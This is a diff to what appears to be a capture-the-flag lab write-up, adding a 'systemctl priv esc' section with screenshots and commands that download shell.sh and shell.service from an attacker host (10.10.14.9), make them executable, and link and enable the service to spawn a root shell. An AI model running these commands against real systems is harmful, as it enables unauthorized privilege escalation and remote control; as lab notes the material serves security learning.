@@ -183,6 +183,29 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Inject
 ![image](https://user-images.githubusercontent.com/123066149/229524029-edb10b85-80ed-4b18-af37-087dfdfd4b5a.png)
 
 
+### systemctl priv esc :
 
+![image](https://user-images.githubusercontent.com/123066149/229596750-b3bb3d45-619e-46c6-9c12-dea4c9d7e7fd.png)
+
+### Create shell.sh file :
+
+![image](https://user-images.githubusercontent.com/123066149/229596855-af214984-801f-4f86-9ae0-d1c8cefb528a.png)
+
+### Create shell.service file :
+### Execstart will execute the shell you need to adapt this part :
+
+![image](https://user-images.githubusercontent.com/123066149/229596962-270993f1-1664-463b-b47f-6a442f1618e0.png)
+
+``wget http://10.10.14.9:80/shell.service && chmod +x  shell.service``
+
+``wget http://10.10.14.9:80/shell.sh && chmod +x  shell.sh``
+
+``systemctl link /home/pepper/shell.service``
+
+``systemctl enable --now shell.service``
+
+![2023-04-03 20_38_02-kali-linux-2022 4-vmware-amd64 - VMware Workstation](https://user-images.githubusercontent.com/123066149/229597833-52860ee3-8cde-4485-9c69-ecd3f93ee1ec.png)
+
+![image](https://user-images.githubusercontent.com/123066149/229597505-d82e0ba4-85c4-48b2-9543-968eb51d8ded.png)
 
 # ${{\color{purple}Point of Improvement}}\ $
